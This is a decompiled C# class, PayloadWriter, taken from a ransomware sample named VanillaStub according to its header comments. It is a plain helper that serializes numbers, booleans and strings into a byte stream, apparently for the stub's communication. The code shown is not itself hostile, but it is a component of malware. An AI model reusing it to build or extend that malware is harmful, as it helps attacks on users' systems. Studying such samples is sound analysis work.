// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.PayloadWriter
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.IO;
using System.Text;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class PayloadWriter : IDisposable
  {
    public PayloadWriter() => this.vStream = (Stream) new MemoryStream();

    public PayloadWriter(Stream stream) => this.vStream = stream;

    public Stream vStream { get; set; }

    public int Length => (int) this.vStream.Length;

    public void Dispose()
    {
      this.vStream.Close();
      this.vStream.Dispose();
      this.vStream = (Stream) null;
    }

    public void WriteBytes(byte[] value) => this.vStream.Write(value, 0, value.Length);

    public void WriteBytes(byte[] value, int Offset, int Length) => this.vStream.Write(value, Offset, Length);

    public void WriteInteger(int value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteThreeByteInteger(int value)
    {
      this.WriteByte((byte) value);
      this.WriteByte((byte) (value >> 8));
      this.WriteByte((byte) (value >> 16));
    }

    public void WriteUInteger(uint value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteShort(short value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteUShort(ushort value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteULong(ulong value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteByte(byte value) => this.vStream.WriteByte(value);

    public void WriteBool(bool value) => this.WriteByte(value ? (byte) 1 : (byte) 0);

    public void WriteDouble(double value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteLong(long value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteFloat(float value) => this.WriteBytes(BitConverter.GetBytes(value));

    public void WriteDecimal(Decimal value) => new BinaryWriter(this.vStream).Write(value);

    public void WriteString(string value)
    {
      if (value == null)
        throw new NullReferenceException(nameof (value));
      this.WriteBytes(Encoding.Unicode.GetBytes(value));
      this.vStream.WriteByte((byte) 0);
      this.vStream.WriteByte((byte) 0);
    }
  }
}
